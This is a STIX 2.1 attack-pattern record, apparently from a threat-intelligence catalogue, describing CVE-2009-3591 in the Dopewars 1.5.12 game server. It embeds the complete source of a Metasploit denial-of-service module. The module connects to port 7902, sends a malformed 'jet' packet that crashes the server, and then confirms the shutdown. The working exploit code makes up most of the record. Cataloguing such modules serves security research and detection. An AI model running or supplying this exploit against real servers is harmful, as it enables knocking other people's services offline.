{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3912931f-741f-4ba3-91b1-43b8634a5127",
    "created": "2024-08-14T16:24:52.97928Z",
    "modified": "2024-08-14T16:24:52.979284Z",
    "name": "Dopewars Denial of Service",
    "description": " The jet command in Dopewars 1.5.12 is vulnerable to a segmentation fault due to a lack of input validation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/misc/dopewars.rb",
            "external_id": "dopewars.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3591"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t => 'Dopewars Denial of Service',\n      'Description'\t => %q{\n          The jet command in Dopewars 1.5.12 is vulnerable to a segmentation fault due to\n        a lack of input validation.\n      },\n      'Author'\t\t => [ 'Doug Prostko <dougtko[at]gmail.com>' ],\n      'License'\t\t => MSF_LICENSE,\n      'References'\t =>\n        [\n          [ 'CVE', '2009-3591' ],\n          [ 'OSVDB', '58884' ],\n          [ 'BID', '36606' ]\n        ],\n      'DisclosureDate' => '2009-10-05' ))\n\n    register_options([Opt::RPORT(7902)])\n  end\n\n  def run\n    # The jet command is vulnerable.\n    # Program received signal SIGSEGV, Segmentation fault.\n    # [Switching to Thread 0xb74916c0 (LWP 30638)]\n    # 0x08062f6e in HandleServerMessage (buf=0x8098828 \"\", Play=0x809a000) at\n    # serverside.c:525\n    # 525\t\t\tdopelog(4, LF_SERVER, \"%s jets to %s\",\n    #\n    connect\n    pkt =  \"foo^^Ar1111111\\n^^Acfoo\\n^AV65536\\n\"\n    print_status(\"Sending dos packet...\")\n    sock.put(pkt)\n    disconnect\n\n    print_status(\"Checking for success...\")\n    select(nil, nil, nil, 2)\n    begin\n      connect\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionRefused\n      print_good(\"Dopewars server successfully shut down!\")\n    else\n      print_error(\"DOS attack unsuccessful\")\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-05 "
}